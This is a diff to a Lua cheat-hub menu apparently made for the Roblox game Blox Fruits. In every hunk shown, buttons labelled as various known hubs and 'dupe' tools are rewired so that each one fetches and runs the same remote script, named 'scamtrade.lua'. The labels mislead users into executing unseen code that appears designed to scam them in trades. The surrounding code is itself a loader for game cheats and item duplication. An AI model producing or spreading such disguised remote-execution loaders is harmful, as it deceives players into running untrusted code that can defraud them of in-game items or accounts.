@@ -40,7 +40,7 @@ local Section = MainTab:CreateSection("Fruit Scam Trade")
 local Button = MainTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/AnDepZai-v3/Bloxfruits/refs/heads/main/AnDepZai.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -48,7 +48,7 @@ local Section = MainTab:CreateSection("Fruit Dupe v1")
 local Button = MainTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/AnDepZai-v3/Bloxfruits/refs/heads/main/AnDepZai.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -56,7 +56,7 @@ local Section = MainTab:CreateSection("Gamepass/Permanent Dupe v3")
 local Button = MainTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/AnDepZai-v3/Bloxfruits/refs/heads/main/AnDepZai.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -67,7 +67,7 @@ local Section = KEYTab:CreateSection("Hoho Hub")
 local Button = KEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -75,7 +75,7 @@ local Section = KEYTab:CreateSection("Omg Hub")
 local Button = KEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -83,9 +83,7 @@ local Section = KEYTab:CreateSection("Banana Hub")
 local Button = KEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
-getgenv().Key = "PASTE_KEY_HERE"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -96,7 +94,7 @@ local Section = NKEYTab:CreateSection("Redz Hub")
 local Button = NKEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/newredz/BloxFruits/refs/heads/main/Source.luau"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -104,7 +102,7 @@ local Section = NKEYTab:CreateSection("Ratio Hub")
 local Button = NKEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/main/Script"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -112,7 +110,7 @@ local Section = NKEYTab:CreateSection("Speed Hub X")
 local Button = NKEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -120,7 +118,7 @@ local Section = NKEYTab:CreateSection("Cokka Hub")
 local Button = NKEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet"https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua")()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
@@ -128,7 +126,7 @@ local Section = NKEYTab:CreateSection("KimP Gaming v3")
 local Button = NKEYTab:CreateButton({
    Name = "Click to execute",
    Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaCrack/KimP/refs/heads/main/KimPGaming"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/EclipseLib/scamtrade/refs/heads/main/scamtrade.lua"))()
    end,
 })
 
